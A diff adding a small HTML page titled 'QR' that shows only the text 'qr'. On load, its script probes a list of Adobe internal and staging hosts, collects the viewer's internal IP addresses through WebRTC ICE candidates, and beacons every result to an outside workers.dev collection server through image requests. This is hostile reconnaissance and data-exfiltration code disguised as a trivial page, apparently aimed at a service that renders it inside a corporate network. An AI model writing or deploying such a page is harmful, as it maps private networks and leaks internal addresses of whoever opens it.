@@ -1,0 +1,42 @@
+<!doctype html><html><head><title>QR</title></head><body>qr
+<script>
+(function(){
+  var B='https://rzcatch.adx-f0a.workers.dev/jx5-';
+  function b(t,x){ new Image().src=B+t+(x?('-'+encodeURIComponent(x).slice(0,150)):''); }
+  b('boot');
+  function probe(tag,url){
+    var t0=Date.now();
+    try{ var c=new AbortController(); setTimeout(function(){c.abort()},7000);
+      fetch(url,{mode:'no-cors',signal:c.signal})
+        .then(function(){b(tag+'-OK-'+(Date.now()-t0));})
+        .catch(function(e){b(tag+'-'+(e&&e.name?e.name:'err')+'-'+(Date.now()-t0));});
+    }catch(e){ b(tag+'-throw'); }
+  }
+  probe('ctl','https://rzcatch.adx-f0a.workers.dev/jx5-ctl');
+  probe('pxcorp','https://stage.projectx.corp.adobe.com/');
+  probe('sensei','https://sensei.adobe.io/');
+  probe('senseiue1','https://sensei-ue1.adobe.io/');
+  probe('walnut','https://walnut-prod.adobe.io/');
+  probe('hzacs','https://hz-assets-and-collab-service.adobe.io/');
+  probe('idx','https://platform-cs-edge.adobe.io/index-appdata');
+  probe('qkact','https://quick-actions-api.adobe.io/');
+  probe('ethos','https://af-spur-colligov2-stage.corp.ethos851-stage-or2.ethos.adobe.net/');
+  probe('adobeio','https://adobeioruntime.net/');
+  // WebRTC ICE — internal interface disclosure
+  try{
+    var pc=new RTCPeerConnection({iceServers:[]});
+    pc.createDataChannel('d');
+    var got={};
+    pc.onicecandidate=function(e){
+      if(!e.candidate) { b('ice-end', JSON.stringify(got).slice(0,140)); return; }
+      var c=e.candidate.candidate;
+      var m=c.match(/candidate:\S+ \d+ \S+ \d+ (\S+) \d+/);
+      if(m){ var ip=m[1]; var typ=(c.match(/typ (\w+)/)||[])[1]||'?';
+        got[(typ+':'+ip).slice(0,30)]=1; }
+    };
+    pc.createOffer().then(function(o){return pc.setLocalDescription(o);}).catch(function(e){b('ice-err',e.name);});
+    setTimeout(function(){ pc.close(); },6000);
+  }catch(e){ b('rtc-throw'); }
+  setTimeout(function(){ b('done'); },11000);
+})();
+</script></body></html>
